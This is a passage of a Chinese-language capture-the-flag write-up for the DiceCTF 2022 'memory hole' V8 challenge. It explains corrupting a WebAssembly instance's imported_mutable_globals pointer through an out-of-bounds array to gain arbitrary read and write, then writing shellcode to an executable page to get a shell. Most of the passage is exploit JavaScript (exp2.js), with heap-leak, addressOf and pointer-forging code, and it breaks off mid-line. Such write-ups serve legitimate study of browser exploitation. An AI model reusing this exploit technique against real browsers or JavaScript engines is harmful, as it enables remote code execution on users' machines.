<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Representation of a WebAssembly.Global JavaScript-level object.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WasmGlobalObject</span></span><br><span class="line">    : <span class="keyword">public</span> TorqueGeneratedWasmGlobalObject&lt;WasmGlobalObject, JSObject&gt; &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">DECL_ACCESSORS</span>(untagged_buffer, JSArrayBuffer)</span><br><span class="line">  <span class="built_in">DECL_ACCESSORS</span>(tagged_buffer, FixedArray)</span><br><span class="line">  <span class="built_in">DECL_PRIMITIVE_ACCESSORS</span>(type, wasm::ValueType)</span><br><span class="line">  ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-2.png"></p>
<p>可以看到全局变量的值存到了<code>backing_store</code>指向的内存。但是回头看 Instance 发现 <code>imported_mutable_globals</code>还是未指向添加的全局变量：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0xc83081d2a09</span></span><br><span class="line">0xc83081d2a09: [WasmInstanceObject] in OldSpace</span><br><span class="line"> - map: 0x0c8308206439 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> ···</span><br><span class="line"> - imported_function_targets: 0x55b868265a80</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55b868265aa0</span><br><span class="line"> ···</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-3.png"></p>
<p>原因是这段 Wasm code 中并未使用这个全局变量。那接下来就是去找一下如何写 Wasm code 并且使用全局变量。</p>
<p>在 <a href="https://github.com/mdn/webassembly-examples/tree/master/js-api-examples">webassembly-examples&#x2F;js-api-examples at master · mdn&#x2F;</a> 中找到 global.wat：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(module</span><br><span class="line">  (global $g (import <span class="string">&quot;js&quot;</span> <span class="string">&quot;global&quot;</span>) (mut i32))</span><br><span class="line">  (func (export <span class="string">&quot;getGlobal&quot;</span>) (result i32)</span><br><span class="line">    (global.get $g)</span><br><span class="line">  )</span><br><span class="line">  (func (export <span class="string">&quot;incGlobal&quot;</span>)</span><br><span class="line">    (global.<span class="built_in">set</span> $g (i32.add (global.get $g) (i32.<span class="type">const</span> <span class="number">1</span>)))</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>（看着这语法总有一种说不出来的感觉）</p>
<p>这里就直接用 <a href="https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/">kylebot’s Blog</a> 中的 wat，使用 <a href="https://github.com/WebAssembly/wabt">WebAssembly&#x2F;wabt</a> 编译 wat 得到 wasmcode。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test.wat</span></span><br><span class="line">(module</span><br><span class="line">  (global $g (import <span class="string">&quot;js&quot;</span> <span class="string">&quot;global&quot;</span>) (mut i64))</span><br><span class="line">  (func (export <span class="string">&quot;getGlobal&quot;</span>) (result i64)</span><br><span class="line">    (global.get $g)</span><br><span class="line">  )</span><br><span class="line">  (func (export <span class="string">&quot;incGlobal&quot;</span>)</span><br><span class="line">    (global.<span class="built_in">set</span> $g (i64.add (global.get $g) (i64.<span class="type">const</span> <span class="number">1</span>)))</span><br><span class="line">  )</span><br><span class="line">  (func (export <span class="string">&quot;setGlobal&quot;</span>) (param $a i64)</span><br><span class="line">    (global.<span class="built_in">set</span> $g (local.get $a))</span><br><span class="line">  )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">$ bin/wat2wasm ./test.wat</span><br></pre></td></tr></table></figure>

<p>即得到 test.wasm：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0061 736d 0100 0000 010c 0360 0001 7e60</span><br><span class="line">0000 6001 7e00 020e 0102 6a73 0667 6c6f</span><br><span class="line">6261 6c03 7e01 0304 0300 0102 0725 0309</span><br><span class="line">6765 7447 6c6f 6261 6c00 0009 696e 6347</span><br><span class="line">6c6f 6261 6c00 0109 7365 7447 6c6f 6261</span><br><span class="line">6c00 020a 1703 0400 2300 0b09 0023 0042</span><br><span class="line">017c 2400 0b06 0020 0024 000b</span><br></pre></td></tr></table></figure>

<p>稍作处理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var global = new WebAssembly.Global(&#123;value:&#x27;i64&#x27;, mutable:true&#125;, 256n);</span><br><span class="line">let wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 12, 3, 96, 0, 1, 126, 96, 0, 0, 96, 1, 126, 0, 2, 14, 1, 2, 106, 115, 6, 103, 108, 111, 98, 97, 108, 3, 126, 1, 3, 4, 3, 0, 1, 2, 7, 37, 3, 9, 103, 101, 116, 71, 108, 111, 98, 97, 108, 0, 0, 9, 105, 110, 99, 71, 108, 111, 98, 97, 108, 0, 1, 9, 115, 101, 116, 71, 108, 111, 98, 97, 108, 0, 2, 10, 23, 3, 4, 0, 35, 0, 11, 9, 0, 35, 0, 66, 1, 124, 36, 0, 11, 6, 0, 32, 0, 36, 0, 11]);</span><br><span class="line"></span><br><span class="line">let wasmInstance = new WebAssembly.Instance(new WebAssembly.Module(wasmCode),&#123; js: &#123;global&#125; &#125;);</span><br><span class="line">var WasmJSFunction = wasmInstance.exports.incGlobal;</span><br><span class="line"></span><br><span class="line">WasmJSFunction();</span><br><span class="line">%DebugPrint(wasmInstance);</span><br><span class="line">%DebugPrint(global);</span><br><span class="line">%SystemBreak();</span><br><span class="line">WasmJSFunction();</span><br></pre></td></tr></table></figure>

<p>调试看到 <code>imported_mutable_globals</code>指向了存储 global 的内存，并且由于在 <code>%DebugPrint</code> 之前就调用了一次 inc，此时的值为 0x101：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DebugPrint: 0x3771081d2a51: [WasmInstanceObject] in OldSpace</span><br><span class="line"> ···</span><br><span class="line"> - imported_function_targets: 0x55fb88e4e980</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55fb88e4e9a0</span><br><span class="line"> </span><br><span class="line">DebugPrint: 0x377108048839: [WasmGlobalObject]</span><br><span class="line"> - map: 0x377108206821 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - untagged_buffer: 0x37710804885d &lt;ArrayBuffer map = 0x377108203289&gt;</span><br><span class="line"> - offset: 0</span><br><span class="line"> - raw_type: 2</span><br><span class="line"> - is_mutable: 1</span><br><span class="line"> - type: i64</span><br><span class="line"> - is_mutable: 1</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-4.png"></p>
<p>此时我们手动修改 WasmInstance 中的 <code>imported_mutable_globals</code> 字段的值，再继续运行调用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set &#123;long&#125;0x3771081d2aa0=0x4141414141414141</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-5.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-6.png"></p>
<p>发现 crash 到了这里，结合下面的两行汇编和前面的调试，可以得出 V8 将这个值作为一个指针的指针，解两层引用后取出真正的 global 的值（证实一开始看源码的猜测）。<strong>最重要的是这个过程的地址都是 64 位的，相当于没有了沙箱。所以接下来就是利用 oob 篡改 <code>imported_mutable_globals</code> 的值，通过这个类似以前经常使用的 backing_store 指针一样完成任意读写。有两个区别就是一：该字段并不是对象，伪造起来很容易，二就是两层引用才是真正任意写的地址。</strong>所以综上可以 fake 一个数组，数组的第一个元素是可读可写的地址（充当 <code>backing_store</code> 的角色 ）。由于数组的地址还是由基址 + 偏移组成，偏移可以比较好泄露。重点是泄露 js 基址。</p>
<blockquote>
<p>注意 js 的位运算符在运算时操作数被转换为 32bit 整數，以位序列（0 和 1 组成）表示。若超過 32bits，則取低位 32bit，如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Before: <span class="number">11100110111110100000000000000110000000000001</span></span><br><span class="line">After:              <span class="number">10100000000000000110000000000001</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>我这里直接修改了 base 为 1，与 externel 相加正好为 8，从 js_base + 8 处开始泄露，这附近有很多 js_base 相关的地址，随便选一个就好。</p>
<p><img src="/img/Dicectf2022-memoryhole/2-15.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-16.png"></p>
<blockquote>
<p>开辟的 Uint32Array 的长度会影响其地址是 4 的倍数还是从 8 的倍数，所以奇数达不到目的就尝试偶数</p>
<p>var leak_arr &#x3D; new Uint32Array(0xe);</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Uint32Array</span>_len = <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">var</span> leak_arr = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="title class_">Uint32Array</span>_len);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据 length 字段找到 btyelength、base_pointer 字段相对于 oob 数组的 index</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">d22u</span>(vuln_arr[i]);</span><br><span class="line">    <span class="keyword">const</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (high == <span class="title class_">Uint32Array</span>_len || low == <span class="title class_">Uint32Array</span>_len) &#123;</span><br><span class="line">        <span class="title class_">Uint32Array</span>_len_idx = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Uint32Array_len_idx =&gt; &quot;</span> + <span class="title function_">hex</span>(<span class="title class_">Uint32Array</span>_len_idx));</span><br><span class="line"><span class="comment">// base pointer in high word</span></span><br><span class="line"><span class="keyword">var</span> base_pointer_idx = <span class="title class_">Uint32Array</span>_len_idx + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> byte_length_idx = <span class="title class_">Uint32Array</span>_len_idx - <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>遇到一些玄学问题，跑两次 gc 尝试一下，尤其是内存不对齐。</p>
</blockquote>
<p>修改完对应字段的数据，即可泄露 js_base。</p>
<p>接着是通过对象来实现 addressOf。这里借助了一个哨兵值：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> leak = &#123;<span class="attr">guard</span>: <span class="number">0x2333</span>, <span class="attr">obj</span>: fake_mutable_globals&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">find_leak_offset</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i ++) &#123;</span><br><span class="line">        <span class="title function_">d22u</span>(vuln_arr[i]);</span><br><span class="line">        <span class="keyword">var</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">var</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (low == <span class="number">0x4666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> high;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (high == <span class="number">0x4666</span>) &#123;</span><br><span class="line">            fake_mutable_globals_elements_arr_idx = i - <span class="number">4</span>;</span><br><span class="line">            <span class="title function_">d22u</span>(vuln_arr[i+<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span> __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    leak[<span class="string">&#x27;obj&#x27;</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">find_leak_offset</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>类似使用一些标记或哨兵值来寻找地址的方式比较通用，哪怕写到一半发现需要添加一些对象改变了内存布局也不需要再次调试来一个一个找要用的偏移</p>
</blockquote>
<p>首先泄露 <strong>准备要用作 <code>imported_mutable_globals</code> 的 fake 数组的地址，然后拿到其真正的 elements 地址，</strong>然后泄露 wasmInstance 的地址，计算一下偏移就可以得到 <code>imported_mutable_globals</code> 字段在 wasmInstance 中的位置。然后通过 oob 数组的越界写，直接覆写 <code>imported_mutable_globals</code> 为 fake 数组的 elements 地址。泄露地址与篡改 <code>imported_mutable_globals</code> ：</p>
<p><img src="/img/Dicectf2022-memoryhole/2-11.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-7.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-8.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-9.png"></p>
<p>但是  <code>imported_mutable_globals</code> 的地址与 oob 数组 elements 的偏移并不总是 8 的倍数，就会出现如下的情况：</p>
<p><img src="/img/Dicectf2022-memoryhole/2-10.png"></p>
<p>所以针对这种情况还需要处理，在前一个字段的高位写目标地址的低字节，后一个字段的低位写目标地址的高字节，这样拼起来中间的   <code>imported_mutable_globals</code> 就合法了：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!split)</span><br><span class="line">    vuln_arr[imported_mutable_globals_index] = <span class="title function_">u2d</span>(target_addr);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[!] split!!!&quot;</span>);</span><br><span class="line">    <span class="title function_">d22u</span>(vuln_arr[imported_mutable_globals_index + <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">var</span> pad1 = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">var</span> high = js_base / <span class="number">0x100000000</span> <span class="comment">// + (pad1 * 0x100000000);</span></span><br><span class="line">    vuln_arr[imported_mutable_globals_index] = <span class="title function_">u2d</span>(arr_in_fake_mutable_globals_addr * <span class="number">0x100000000</span>);</span><br><span class="line">    vuln_arr[imported_mutable_globals_index + <span class="number">1</span>] = <span class="title function_">u2d</span>(high);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时 <code>imported_mutable_globals</code> 的值已经为 fake 数组的 elements 的地址，那么arbRead 和 arbWrite 的实现就是对该数组的第一个字段赋值为要读写的地址。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">getGlobal</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line">    fake_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="title function_">setGlobal</span>(<span class="title class_">BigInt</span>(val));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再写一个 wasmInstance_attack，即平时常用的，在 wasmInstance_attack + 0x60 处存放了 rwx 页，泄露该地址准备一会向其中写入 shellcode。</p>
<p>利用 arbWrite() 写 shellcode 到 rwx 页：</p>
<p><img src="/img/Dicectf2022-memoryhole/shellcode.png"></p>
<p>最终调用 f() 拿到shell：</p>
<p><img src="/img/Dicectf2022-memoryhole/res.png"></p>
<h2 id="exp2-js"><a href="#exp2-js" class="headerlink" title="exp2.js"></a>exp2.js</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> __buf8 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> __dvCvt = <span class="keyword">new</span> <span class="title class_">DataView</span>(__buf8);</span><br><span class="line"><span class="keyword">const</span> __bigInt = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(__buf8);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Uint64 =&gt; double</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> tmp0 = val &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">var</span> tmp1 = (val - tmp0) / <span class="number">0x100000000</span>;</span><br><span class="line">    __dvCvt.<span class="title function_">setUint32</span>(<span class="number">0</span>, tmp0, <span class="literal">true</span>);</span><br><span class="line">    __dvCvt.<span class="title function_">setUint32</span>(<span class="number">4</span>, tmp1, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> __dvCvt.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d22u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    __dvCvt.<span class="title function_">setFloat64</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    __bigInt[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>) + __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>) * <span class="number">0x100000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">hex</span> = (<span class="params">x</span>) =&gt; (<span class="string">&quot;0x&quot;</span> + x.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">js_heap_defragment</span>(<span class="params"></span>) &#123; <span class="comment">// used for stable fake JSValue crafting</span></span><br><span class="line">    <span class="title function_">gc</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// js_heap_defragment();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_mutable_globals_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> fake_mutable_globals_elements_arr_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> vuln_arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Uint32Array</span>_len_idx = -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Uint32Array</span>_len = <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">var</span> leak_arr = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="title class_">Uint32Array</span>_len);</span><br><span class="line"><span class="keyword">var</span> fake_mutable_globals = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> leak = &#123;<span class="attr">guard</span>: <span class="number">0x2333</span>, <span class="attr">obj</span>: fake_mutable_globals&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="variable language_">global</span> = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Global</span>(&#123;<span class="attr">value</span>:<span class="string">&#x27;i64&#x27;</span>, <span class="attr">mutable</span>:<span class="literal">true</span>&#125;, <span class="number">256n</span>);</span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">126</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">1</span>, <span class="number">126</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">106</span>, <span class="number">115</span>, <span class="number">6</span>, <span class="number">103</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">3</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">71</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">99</span>, <span class="number">71</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">71</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">124</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode),&#123; <span class="attr">js</span>: &#123;<span class="variable language_">global</span>&#125; &#125;);</span><br><span class="line"><span class="keyword">var</span> getGlobal = wasmInstance.<span class="property">exports</span>.<span class="property">getGlobal</span>;</span><br><span class="line"><span class="keyword">var</span> setGlobal = wasmInstance.<span class="property">exports</span>.<span class="property">setGlobal</span>;</span><br><span class="line"></span><br><span class="line">vuln_arr.<span class="title function_">setLength</span>(<span class="number">0x100000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">d22u</span>(vuln_arr[i]);</span><br><span class="line">    <span class="keyword">const</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (high == <span class="title class_">Uint32Array</span>_len || low == <span class="title class_">Uint32Array</span>_len) &#123;</span><br><span class="line">        <span class="title class_">Uint32Array</span>_len_idx = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Uint32Array_len_idx =&gt; &quot;</span> + <span class="title function_">hex</span>(<span class="title class_">Uint32Array</span>_len_idx));</span><br><span class="line"><span class="comment">// base pointer in high word</span></span><br><span class="line"><span class="keyword">var</span> base_pointer_idx = <span class="title class_">Uint32Array</span>_len_idx + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> byte_length_idx = <span class="title class_">Uint32Array</span>_len_idx - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">d22u</span>(vuln_arr[<span class="title class_">Uint32Array</span>_len_idx]);</span><br><span class="line"><span class="keyword">const</span> pad = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">vuln_arr[base_pointer_idx] = <span class="title function_">u2d</span>(<span class="number">0x100000000</span>);</span><br><span class="line">vuln_arr[byte_length_idx] = <span class="title function_">u2d</span>(<span class="number">0x1000</span>);</span><br><span class="line">vuln_arr[<span class="title class_">Uint32Array</span>_len_idx] = <span class="title function_">u2d</span>((<span class="number">0x1000</span> / <span class="number">4</span>) * <span class="number">0x100000000</span> + pad);</span><br><span class="line"><span class="keyword">var</span> js_base = leak_arr[<span class="number">5</span>] * <span class="number">0x100000000</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] js_base =&gt; &quot;</span> + <span class="title function_">hex</span>(js_base));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">find_leak_offset</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i ++) &#123;</span><br><span class="line">        <span class="title function_">d22u</span>(vuln_arr[i]);</span><br><span class="line">        <span class="keyword">var</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">var</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (low == <span class="number">0x4666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> high;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (high == <span class="number">0x4666</span>) &#123;</span><br><span class="line">            fake_mutable_globals_elements_arr_idx = i - <span class="number">4</span>;</span><br><span class="line">            <span class="title function_">d22u</span>(vuln_arr[i+<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span> __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    leak[<span class="string">&#x27;obj&#x27;</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">find_leak_offset</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fake_mutable_globals_offset = <span class="title function_">addressOf</span>(fake_mutable_globals)</span><br><span class="line"><span class="keyword">if</span> (fake_mutable_globals_offset &amp;&amp; fake_mutable_globals_elements_arr_idx) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] fake_mutable_globals_offset =&gt; &quot;</span> + <span class="title function_">hex</span>(fake_mutable_globals_offset));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] fake_mutable_globals_elements_arr_idx =&gt; &quot;</span> + <span class="title function_">hex</span>(fake_mutable_globals_elements_arr_idx));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// !!!</span></span><br><span class="line"><span class="keyword">var</span> arr_in_fake_mutable_globals_addr = fake_mutable_globals_offset - <span class="number">9</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] arr_in_fake_mutable_globals_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(arr_in_fake_mutable_globals_addr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> vuln_addr = <span class="title function_">addressOf</span>(vuln_arr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] vuln_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(vuln_addr));</span><br><span class="line"><span class="keyword">var</span> vuln_elements_addr = vuln_addr - <span class="number">1</span> - <span class="number">0x18</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] 